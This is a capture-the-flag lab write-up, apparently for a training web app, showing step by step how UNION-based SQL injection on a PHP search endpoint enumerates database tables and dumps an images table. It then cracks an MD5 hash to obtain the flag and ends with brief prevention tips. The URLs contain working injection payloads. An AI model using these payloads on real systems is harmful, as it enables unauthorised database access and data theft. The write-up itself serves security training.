

+ ### we found an SQL injection on search img endpoing
|
|---+ /index.php?page=searchimg&id=2 UNION SELECT NULL, NULL ;--&Submit=Submit
|   |
|   |- you can see that this endpoint return two rows so that mean the injection succeed
|   |- plus this endpoint return two columns 
|   
|---+ /index.php?page=searchimg&id=2+UNION+SELECT+char%28124%29%2C+char%28122%29%3B--&Submit=Submit#  
|   |
|   |-  this also return two rows 
|   |-  that's mean that the two columns data type is string (varchar)
|
|---+ /index.php?page=member&id=1 UNION SELECT table_schema, CONCAT(table_name,CHAR(124),column_name) FROM information_schema.columns;--&Submit=Submit
|   |
|   |- here is an endpoing that query tables the database where they exists and all columns they contains
|   |- we assume that the images we search for exists in the Member_images database in the table list_images
|   |- list_images columns are id, url, title , comment
|   |-  UNION SELECT id, CONCAT(url, CHAR(124), title, CHAR(124), comment) FROM list_images
|   |- this query will help us query all the table of images
|
|--+ /index.php?page=searchimg&id=1%20UNION%20SELECT%20id,%20CONCAT(url,%20CHAR(124),%20title,%20CHAR(124),%20comment)%20FROM%20list_images;--&Submit=Submit
|  |
|  |- this endpoint show us the flag 
|  |- Title: borntosec.ddns.net/images.png|Hack me ?|If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
|  |- after cracking this md5 '1928e8083cf461a51303633093573c46' we got 'albatroz'
|  |- the flag is  : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
|__|


+ To prevent:
|
|
|- Never trust user input
|- Always sanitize user input
|- Do not build queries manually; use an ORM or a library designed for query building.
